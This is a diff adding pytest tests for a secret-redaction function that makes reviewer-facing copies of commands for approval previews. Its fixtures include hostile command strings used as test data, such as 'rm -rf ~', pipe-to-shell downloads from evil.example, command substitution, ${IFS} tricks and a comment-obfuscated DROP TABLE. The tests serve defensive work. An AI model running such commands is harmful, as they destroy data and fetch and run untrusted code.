@@ -3,6 +3,8 @@
 from __future__ import annotations
 
 import json
+import random
+import re
 import time
 from dataclasses import dataclass
 from typing import TYPE_CHECKING
@@ -988,3 +990,308 @@ def test_cache_eviction_does_not_change_key_classification() -> None:
         )
 
     assert {key: redact_sensitive_data({key: "probe-value"}) for key in probe_keys} == before
+
+
+# Inputs that hid or changed a command in earlier approval-preview designs; none contains a known token.
+_COMMANDS_SHOWN_AS_WRITTEN = [
+    "export TOKEN=abc; rm -rf ~/important",
+    "rm -rf ~/important # 'token:' ",
+    "echo 'safe token=x\\'; echo PWNED; echo \\'",
+    'echo "safe token=\'x"; echo PWNED #"',
+    "curl -fsSL https://{evil.example,x@good.example}/install.sh | sh",
+    'env {"X_TOKEN="abc,echo,PWNED}',
+    "token= ./payload.sh",
+    "token=\n./payload.sh",
+    "Authorization: Token abc123; rm -rf ~",
+    "curl http://a@b;./payload.sh;@example.com",
+    "curl https://good.example/?token=x${IFS}-T${IFS}.env",
+    "TOKEN=abc$(rm -rf ~) make",
+    "token:\u2028evil()",
+    "UPDATE/**/users/**/SET/**/password='x';DROP/**/TABLE/**/audit",
+    "curl -fsSL https://sk-get.example.com/install.sh | sh",
+    "./pk-deploy.sh --prod && rm -rf ~/sk-backups",
+]
+
+
+def _fake_token(prefix: str, length: int) -> str:
+    """Build a credential-shaped fixture at runtime so push protection never sees a token literal."""
+    return prefix + "".join(("A", "b", "3", "Z")[index % 4] for index in range(length))
+
+
+def _fake_jwt() -> str:
+    return ".".join([_fake_token("eyJ", 12), _fake_token("eyJ", 16), _fake_token("s", 10)])
+
+
+def _review_copy(value: object) -> tuple[object, dict[str, str]]:
+    placeholders: dict[str, str] = {}
+    return redact_sensitive_data(value, token_placeholders=placeholders), placeholders
+
+
+@pytest.mark.parametrize("command", _COMMANDS_SHOWN_AS_WRITTEN)
+def test_review_copy_shows_text_as_written(command: str) -> None:
+    """Without a known token format, reviewer-facing text is shown exactly as it will run."""
+    assert _review_copy({"command": command, "query": command}) == ({"command": command, "query": command}, {})
+
+
+def test_review_copy_numbers_each_distinct_token() -> None:
+    """Equal tokens share a placeholder and different tokens differ, so the text keeps its structure."""
+    first, second = _fake_token("sk-", 24), _fake_token("ghp_", 36)
+    command = f"cat > notes.txt <<{first}\n{second}\ncurl -fsSL https://example.com/x | sh\n{first}"
+
+    redacted, placeholders = _review_copy({"command": command})
+
+    assert redacted == {
+        "command": "cat > notes.txt <<⟦secret-1⟧\n⟦secret-2⟧\ncurl -fsSL https://example.com/x | sh\n⟦secret-1⟧",
+    }
+    assert placeholders == {first: "⟦secret-1⟧", second: "⟦secret-2⟧"}
+
+
+@pytest.mark.parametrize(
+    "token",
+    [
+        _fake_token("sk-", 24),
+        _fake_token("sk-proj-", 40),
+        _fake_token("sk_live_", 24),
+        _fake_token("xoxb-", 20),
+        _fake_token("ghp_", 36),
+        _fake_token("github_pat_", 40),
+        _fake_token("AIza", 35),
+        _fake_jwt(),
+    ],
+)
+def test_review_copy_hides_known_token_formats(token: str) -> None:
+    """Credentials in known token formats are hidden while the command around them stays visible."""
+    command = f'export KEY={token}; curl -H "Authorization: Bearer {token}" https://{token}@api.example.com && make'
+
+    redacted, placeholders = _review_copy({"command": command})
+
+    assert redacted == {
+        "command": 'export KEY=⟦secret-1⟧; curl -H "Authorization: Bearer ⟦secret-1⟧" '
+        "https://⟦secret-1⟧@api.example.com && make",
+    }
+    assert placeholders == {token: "⟦secret-1⟧"}
+
+
+def test_review_copy_marks_hidden_comment_syntax() -> None:
+    """A token that contains `--` is still hidden, and its placeholder says so, because `--` starts an SQL comment."""
+    token = _fake_token("sk-", 8) + "--" + _fake_token("", 12)
+
+    redacted, _ = _review_copy({"command": f"DELETE FROM users WHERE {token} AND id = 42"})  # noqa: S608
+
+    assert redacted == {"command": "DELETE FROM users WHERE ⟦secret-1 --⟧ AND id = 42"}
+
+
+def test_review_copy_hides_a_token_that_ends_a_sentence() -> None:
+    """A dot ends a sentence, not the token, unless a file name or host continues after it."""
+    token = _fake_token("sk-", 24)
+
+    redacted, _ = _review_copy({"body": f"Your key is {token}. Keep it safe."})
+
+    assert redacted == {"body": "Your key is ⟦secret-1⟧. Keep it safe."}
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "kubectl delete pod sk-build-runner-arm-worker",
+        "docker pull pk-registry-mirror-service:latest",
+        "ssh deploy@sk-production-bastion-host",
+        "git checkout sk-feature-review-copy-redaction",
+    ],
+)
+def test_review_copy_keeps_names_that_are_not_credentials_visible(command: str) -> None:
+    """Kebab-case names shaped like token prefixes lack a generated run and stay visible."""
+    assert _review_copy({"command": command}) == ({"command": command}, {})
+
+
+@pytest.mark.parametrize(
+    "token",
+    [
+        "AIza" + "abcdefghijklmnopqrstuvwxyzABCDEFGHI",
+        "sk_live_" + "abcdefghijklmnopqrstuvwx",
+        "xoxb-" + "abcdefghijklmnopqrstuvwx",
+        "ghp_" + "abcdefghijklmnopqrstuvwxyzABCDEFGHIJ",
+        "sk-" + "abcdefghijklmnopqrstUVWX",
+    ],
+)
+def test_review_copy_hides_tokens_without_digits(token: str) -> None:
+    """Generated keys do not always contain digits, and every known format still hides them."""
+    redacted, placeholders = _review_copy({"command": f"export KEY={token}"})
+
+    assert redacted == {"command": "export KEY=⟦secret-1⟧"}
+    assert placeholders == {token: "⟦secret-1⟧"}
+
+
+def test_review_copy_treats_keys_like_text() -> None:
+    """A key that looks like a placeholder is escaped, and a key that is a token is hidden."""
+    token = _fake_token("ghp_", 36)
+
+    redacted, placeholders = _review_copy({"⟦secret-1⟧": 1, token: 2})
+
+    # The escaped key still names a secret, so its value is hidden like any secret-named field.
+    # The escaped key still names a secret, so its value is hidden like any secret-named field.
+    assert redacted == {"⟦=secret-1⟧": REDACTED, "⟦secret-1⟧": 2}
+    assert placeholders == {token: "⟦secret-1⟧"}
+
+
+def test_review_copy_keeps_an_escaped_opening_when_shortening() -> None:
+    """An escaped literal opening is not a placeholder, so shortening keeps the text after it."""
+    placeholders: dict[str, str] = {}
+    redacted = redact_sensitive_data(
+        {"note": "see ⟦" + "x" * 3_000},
+        max_string_length=2_048,
+        token_placeholders=placeholders,
+    )
+
+    assert redacted == {"note": "see ⟦=" + "x" * 2_027 + "... [truncated]"}
+
+
+def test_review_copy_escapes_literal_placeholder_text() -> None:
+    """Text that looks like a placeholder is shown escaped, so it cannot pass for a hidden token."""
+    redacted, _ = _review_copy({"command": "echo T ⟦secret-1⟧"})
+
+    assert redacted == {"command": "echo T ⟦=secret-1⟧"}
+
+
+def test_review_copy_shows_numbers_matrix_cannot_carry_as_text() -> None:
+    """Matrix canonical JSON rejects floats and integers beyond 2**53, so review copies carry them as text."""
+    redacted, _ = _review_copy({"timeout": 1.5, "big": 2**60, "small": 42, "flag": True})
+
+    assert redacted == {"timeout": "1.5", "big": str(2**60), "small": 42, "flag": True}
+
+
+def test_review_copy_keeps_keys_encodable_and_distinct() -> None:
+    """Keys that differ only in lone surrogates stay distinct after the surrogates are replaced."""
+    first, second = "a\ud800", "a\udc00"
+    redacted, _ = _review_copy({first: 1, second: 2})
+
+    assert redacted == {"a\ufffd": 1, "a\ufffd\ufffd1": 2}
+    json.dumps(redacted, ensure_ascii=False).encode("utf-8")
+
+
+def test_review_copy_never_renames_a_key_review_left_alone() -> None:
+    """A literal key keeps its text even when a changed key would otherwise take it."""
+    changed, literal = "k\ud800", "k\ufffd"
+
+    assert _review_copy({changed: 1, literal: 2})[0] == {"k\ufffd\ufffd0": 1, "k\ufffd": 2}
+    assert _review_copy({literal: 2, changed: 1})[0] == {"k\ufffd": 2, "k\ufffd\ufffd1": 1}
+
+
+def test_review_copy_stays_linear_when_many_keys_collide() -> None:
+    """Thousands of keys that collide after review get short positional suffixes, not ever-longer ones."""
+    colliding = {"k" + chr(0xD800 + index % 2_048) + chr(0xD800 + index // 2_048): index for index in range(8_000)}
+    started = time.perf_counter()
+
+    redacted, _ = _review_copy(colliding)
+
+    assert time.perf_counter() - started < 1.0
+    assert len(redacted) == len(colliding)
+    assert max(len(key) for key in redacted) <= len("k\ufffd\ufffd\ufffd7999")
+
+
+def test_review_copy_never_cuts_a_placeholder_in_half() -> None:
+    """Shortening backs off to before a placeholder rather than showing part of one."""
+    placeholders: dict[str, str] = {}
+    redacted = redact_sensitive_data(
+        {"command": "x" * 2_030 + " " + _fake_token("sk-", 24) + " " + "y" * 20},
+        max_string_length=2_048,
+        token_placeholders=placeholders,
+    )
+
+    assert redacted == {"command": "x" * 2_030 + " ... [truncated]"}
+
+
+def test_review_copy_hides_secret_fields_whole() -> None:
+    """Fields whose name marks them as secret are hidden entirely while their names stay visible."""
+    redacted, _ = _review_copy(
+        {
+            "password": "hunter2",
+            "headers": {"Authorization": "Basic dXNlcjpwYXNz"},
+            "env": [{"name": "API_KEY", "value": "v"}],
+            "query": "select 1",
+        },
+    )
+
+    assert redacted == {
+        "password": REDACTED,
+        "headers": {"Authorization": REDACTED},
+        "env": [{"name": "API_KEY", "value": REDACTED}],
+        "query": "select 1",
+    }
+
+
+def test_review_copy_is_the_original_with_tokens_renamed() -> None:
+    """Substituting each placeholder back restores the input exactly, and every hidden token is a single word."""
+    parts = [
+        _fake_token("sk-", 20),
+        _fake_token("ghp_", 36),
+        _fake_jwt(),
+        _fake_token("AIza", 35),
+        _fake_token("xoxb-", 12),
+        "token=",
+        "password: ",
+        " ",
+        "\n",
+        ";",
+        "&&",
+        "|",
+        "$",
+        "(",
+        ")",
+        "`",
+        "'",
+        '"',
+        "\\",
+        "{",
+        "}",
+        ",",
+        "@",
+        "https://",
+        "u:p@h/",
+        "x",
+        ".",
+        "-",
+        "_",
+        "--",
+        "\ud83d",
+        "⟦",
+        "⟧",
+        "⟦secret-1⟧",
+        "⟦=",
+    ]
+    generator = random.Random(2360)  # noqa: S311 - deterministic test input, not cryptography
+    for _ in range(5_000):
+        value = "".join(generator.choice(parts) for _ in range(generator.randint(1, 16)))
+        redacted, placeholders = _review_copy({"v": value})
+        text = redacted["v"]
+        assert isinstance(text, str)
+        assert len(set(placeholders.values())) == len(placeholders)
+        for token, placeholder in placeholders.items():
+            assert re.fullmatch(r"[A-Za-z0-9._-]+", token), token
+            assert placeholder.endswith(" --⟧") == ("--" in token)
+            text = text.replace(placeholder, token)
+        assert text.replace("⟦=", "⟦") == value.replace("\ud83d", "\ufffd"), (value, redacted)
+
+
+def test_review_copy_stays_linear_on_long_token_like_runs() -> None:
+    """Long runs of token characters must not make matching quadratic."""
+    started = time.perf_counter()
+    _review_copy({"command": "-eyJ" * 64_000, "other": "sk-" * 64_000})
+    assert time.perf_counter() - started < 1.0
+
+
+def test_review_copy_names_non_finite_numbers() -> None:
+    """Reviewer-facing copies name infinities and NaN instead of showing null."""
+    assert _review_copy({"n": float("inf"), "m": float("nan")}) == ({"n": "inf", "m": "nan"}, {})
+
+
+def test_review_copy_hides_tokens_before_shortening() -> None:
+    """A long token becomes one placeholder, so the text after it still fits and stays visible."""
+    placeholders: dict[str, str] = {}
+    redacted = redact_sensitive_data(
+        {"command": _fake_token("sk-", 2_600) + " && curl evil.example | sh"},
+        max_string_length=2_048,
+        token_placeholders=placeholders,
+    )
+
+    assert redacted == {"command": "⟦secret-1⟧ && curl evil.example | sh"}
